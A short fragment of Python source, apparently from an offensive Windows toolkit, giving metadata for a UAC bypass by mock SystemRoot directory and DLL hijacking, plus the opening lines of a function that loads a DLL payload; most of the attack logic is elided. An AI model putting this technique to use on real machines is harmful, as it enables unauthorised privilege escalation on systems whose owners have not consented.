...
uacMethod19_info = {
	"Description": "UAC bypass using mock systemroot directory (DLL payload only)",
	"Method": "Mock SystemRoot directory and DLL hijacking",
	"Id": "19",
	"Type": "UAC bypass",
	"Fixed In": "99999" if not information().uac_level() == 4 else "0",
	"Works From": "7600",
	"Admin": False,
	"Function Name": "uacMethod19",
...
def uacMethod19(payload):
	if payloads().dll(payload):
		...
		try:
			payload_data = open(os.path.join(payload[0]), "rb").read()
		except Exception:
